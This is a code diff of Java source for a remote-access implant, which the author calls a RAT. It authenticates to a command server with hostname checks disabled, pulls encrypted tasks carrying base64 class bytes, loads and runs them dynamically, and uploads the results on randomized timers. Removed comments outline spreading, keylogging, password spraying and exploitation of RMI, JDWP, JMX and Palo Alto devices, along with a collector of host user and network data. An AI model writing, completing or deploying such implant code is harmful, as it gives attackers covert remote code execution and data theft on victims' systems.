@@ -1,8 +1,13 @@
+package com.nocebo.nCore;
+
 import java.io.BufferedReader;
+import java.io.ByteArrayInputStream;
 import java.io.File;
 import java.io.FileReader;
 import java.io.StringWriter;
 import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
 import java.io.StringReader;
 import java.lang.management.ManagementFactory;
@@ -13,6 +18,7 @@ import java.util.Enumeration;
 import java.util.Hashtable;
 import java.util.UUID;
 import java.util.concurrent.TimeUnit;
+import java.util.stream.Collectors;
 import java.util.Base64;
 import org.w3c.dom.Document;
 import org.w3c.dom.Element;
@@ -28,6 +34,7 @@ import javax.xml.transform.dom.DOMSource;
 import javax.xml.transform.*;
 import javax.xml.transform.stream.StreamResult;
 import java.net.UnknownHostException;
+import java.nio.charset.StandardCharsets;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.KeyManagementException;
 import java.security.NoSuchAlgorithmException;
@@ -79,8 +86,9 @@ class nConfig
     };
 }
 
-public class nCore
+public class Main
 {
+    //"C:\Program Files\Java\jdk1.8.0_202\bin\javac.exe" src\main\java\com\nocebo\nCore\*.java -d ..\server\fileroot
     static public String cookieData = "null";
     static public String sessUUID = "";
     static public String nonce = "";
@@ -126,12 +134,12 @@ public class nCore
         {
             try
             {  
-                System.out.println(nComm.mkAuth());
                 String cReq = nComm.request(nComm.mkAuth(),"auth");
 
                 if (cReq != "null")
                 {
-                    Hashtable xmlResponse = nUtil.xmlStringToParseable(cReq);    
+                    Hashtable xmlResponse = nUtil.xmlStringToParseable(cReq);  
+                    System.out.println(xmlResponse.toString());  
 
                     nonce = xmlResponse.get("nonce").toString();
                     cookieData = xmlResponse.get("cookie").toString();
@@ -141,9 +149,11 @@ public class nCore
 
                     for (int k=0; k<taskSet.size(); k++)
                     {
-                        tasks.add(taskSet);
+                        tasks.add(taskSet.get(k));
                     }
-                    System.out.println("success");
+
+                    System.out.println(tasks.toString());
+                    break;
                 }
                 else
                 {
@@ -188,21 +198,7 @@ public class nCore
                 )
             ).split(",");
 
-            //I think this might not work, I may have to just execute the classdata directly rather than loading it
-            //Hashtable methObj = nUtil.getMethodByName(methodName);
 
-            //if (methObj == null)
-            //{
-            //    //install module
-            //    packager.load(className, methodical);
-            //    methObj = nUtil.getMethodByName(methodName);
-            //}
-
-            //threader(
-            //    (Class) methObj.get("class"),
-            //    (Method) methObj.get("method"),
-            //    args
-            //);
             Class classObj = packager.load(className, classical);
             Hashtable methObj = nUtil.getMethodByName(classObj, methodName);
 
@@ -214,7 +210,7 @@ public class nCore
                 outObj.put("output","");
                 outObj.put("error",String.format("Unable to load method %s, exception follows: %s",methodName,methObj.get("error").toString()));
 
-                nCore.output.add(outObj);
+                Main.output.add(outObj);
             }
             else
             {
@@ -247,9 +243,8 @@ public class nCore
             {
                 try {
                     TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(1,7))*1000);
-                    Hashtable outTable = (Hashtable) output.get(d);
-                    String keyName = outTable.keySet().stream().findFirst().get().toString();
-                    String cReq = nComm.request(outTable.get(keyName).toString(),"upload");
+                    Document outData = (Document) output.get(d);
+                    String cReq = nComm.request(nUtil.xmlDocToString(outData),"upload");
                 }
                 catch (Exception e)
                 {
@@ -294,106 +289,22 @@ public class nCore
         private Class load(String className, String classical)
         {
             byte[] rawMeth = Base64.getDecoder().decode(classical);
-            return defineClass(className, rawMeth, 0, rawMeth.length);
+            return defineClass(String.format("com.nocebo.nCore.%s",className), rawMeth, 0, rawMeth.length);
         }
     }
 
-
-                    /*
-        private static class autoLib
-        {
-
-            private void metastasize()
-            {
-                // spreader governor module, searches the autolib inner class cancer for any modules other than itself and runs them
-                // get onto palos, grab passwords, pivot
-                // exploit rmi/ndwp/jmx
-                // keylog, operator puts passwords in vault, password spray
-            }
-
-            private void inputGather()
-            {
-                // log keystrokes w/jnativehook or awt robot
-            }
-             
-            private void getRMIHosts()
-            {
-
-            }
-
-            private void getNDWPHosts()
-            {
-
-            }
-
-            private void getPanos()
-            {
-
-            }
-
-            private void strikeRMI()
-            {
-
-            }
-
-            private void strikeNDWP()
-            {
-
-            }
-
-            private void strikePanos()
-            {
-
-            }
-        }
-
-        private class genLib
-        {
-            private void metadata(String[] args) throws SocketException, UnknownHostException, ParserConfigurationException, TransformerException
-            {
-                Hashtable<String,String> outObj = new Hashtable<>();
-                Hashtable<String,String> metadata = new Hashtable<>();
-                utilitarian nUtil = new utilitarian();
-
-                metadata.put("arch",System.getProperty("os.arch"));
-                metadata.put("os",System.getProperty("os.name"));
-                metadata.put("version",System.getProperty("os.version"));
-                metadata.put("user",System.getProperty("user.name"));
-                metadata.put("cwd",System.getProperty("user.dir"));
-                metadata.put("jre",System.getProperty("java.runtime.version"));
-                metadata.put("interfaces",nUtil.getAddress().toString());
-                metadata.put("hostname",nUtil.getHostname());
-                metadata.put("uuid",sessUUID);
-                metadata.put("timestamp",new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new java.util.Date()));
-                metadata.put("output",nUtil.xmlDocToString(metaDoc));
-                metadata.put("error","")
-
-
-                Document metaDoc = nUtil.outputToXmlDoc("metadata",metadata);
-
-                outObj.put(new Object(){}.getClass().getEnclosingMethod().getName(),metaDoc)
-
-                nCore.output.add(outObj);
-            }
-        }
-
-        private class nixLib
-        {
-            //currently empty, populated when modules updated
-        }
-
-        private class winLib
-        {
-            //currently empty, populated when modules updated
-        }
-        */
-
-
-
-    private static class utilitarian
+    public static class utilitarian
     {
 	
-        
+        public static String streamToString(InputStream iStream)
+        {
+            String text = new BufferedReader(
+              new InputStreamReader(iStream, StandardCharsets.UTF_8))
+                .lines()
+                .collect(Collectors.joining("\n"));
+            return text;
+        }
+
 	    public static int rngenerator(int min, int max) throws NoSuchAlgorithmException 
         {
 		    SecureRandom rHandle = SecureRandom.getInstance("SHA1PRNG");
@@ -419,7 +330,7 @@ public class nCore
             return methObj;
         }
 
-        private Hashtable xmlStringToParseable(String input) throws ParserConfigurationException, IOException, SAXException
+        public Hashtable xmlStringToParseable(String input) throws ParserConfigurationException, IOException, SAXException
         {
             //responses should adhere to pattern:
             //<response><nonce data=""></nonce><cookie data=""></cookie><task class="" method="" args="b64">b64moddata</task></response>
@@ -436,12 +347,7 @@ public class nCore
             for (int n=0;n<nl.getLength();n++)
             {
                 Node nodeData = nl.item(n);
-                if (nodeData.getNodeType() == Node.ATTRIBUTE_NODE && nodeData.getNodeName() != "task")
-                {
-                    Element nodeElement = (Element) nodeData;
-                    xmlData.put(nodeElement.getTagName(),nodeElement.getAttribute("data"));
-                }
-                else if (nodeData.getNodeName() == "task")
+                if (nodeData.getNodeName() == "task")
                 {
                     ArrayList taskSet = (ArrayList) xmlData.get("tasks");
                     Hashtable taskDescriptor = new Hashtable();
@@ -456,11 +362,16 @@ public class nCore
                     taskSet.add(taskDescriptor);
                     xmlData.put("tasks",taskSet);
                 }
+                else
+                {
+                    Element nodeElement = (Element) nodeData;
+                    xmlData.put(nodeElement.getTagName(),nodeElement.getAttribute("data"));
+                }
             }
             return xmlData;
         }
 
-        private String xmlDocToString(Document xmlDoc) throws TransformerException
+        public String xmlDocToString(Document xmlDoc) throws TransformerException
         {
             TransformerFactory tFacInst = TransformerFactory.newInstance();
             Transformer tFac = tFacInst.newTransformer();
@@ -469,7 +380,7 @@ public class nCore
             return stWrite.toString();
         }
 
-        private Document outputToXmlDoc(String rootName, Hashtable<String,String> output) throws ParserConfigurationException
+        public Document outputToXmlDoc(String rootName, Hashtable<String,String> output) throws ParserConfigurationException
         {
             DocumentBuilderFactory manufactorum = DocumentBuilderFactory.newInstance();
             DocumentBuilder constructor = manufactorum.newDocumentBuilder();
@@ -497,7 +408,7 @@ public class nCore
         }
 
         //copied from my old RAT project, lycanthropy
-        private String getHostname() throws UnknownHostException {
+        public String getHostname() throws UnknownHostException {
             String deviceName = new String();
                 try {
                     InetAddress ipAddress = InetAddress.getLocalHost();
@@ -525,7 +436,7 @@ public class nCore
         }
         
         //copied from my old RAT project, lycanthropy
-        private Hashtable getAddress() throws SocketException {
+        public Hashtable getAddress() throws SocketException {
             Hashtable interfaceMap = new Hashtable();
             Enumeration interfaces = NetworkInterface.getNetworkInterfaces();
             while(interfaces.hasMoreElements()) {
@@ -542,7 +453,7 @@ public class nCore
         }
     }
 
-    
+
     private static class network
     {
         private String mkAuth() throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
@@ -596,7 +507,7 @@ public class nCore
                 connMan.setHostnameVerifier(allHostsValid);
 
                 OutputStreamWriter connOutWriter = new OutputStreamWriter(connMan.getOutputStream());
-
+                
                 String postBlob = new String(
                     Base64.getUrlEncoder().encode(
                         secInst.encrypt(
@@ -606,25 +517,27 @@ public class nCore
                     )
                 );
 
-                System.out.println(postBlob);
-
                 connOutWriter.write(
                     postBlob
                 );
-                
-                System.out.println("sending to server");
 
-                connOutWriter.close();
+                connOutWriter.flush();
 
                 if (connMan.getResponseCode() == HttpsURLConnection.HTTP_OK)
                 {
-                    System.out.println("receiving data");
+
+                    BufferedReader connInReader = new BufferedReader(new InputStreamReader(connMan.getInputStream()));
+                    String responseData = connInReader.readLine();
+                    connOutWriter.close();
+                    connInReader.close();
+
                     byte[] decodedResponseData = secInst.decrypt(
                         Base64.getDecoder().decode(
-                            connMan.getResponseMessage()
+                            responseData
                         ),
                         nonce.getBytes()
                     );
+
                     return new String(decodedResponseData);
                 }
                 else
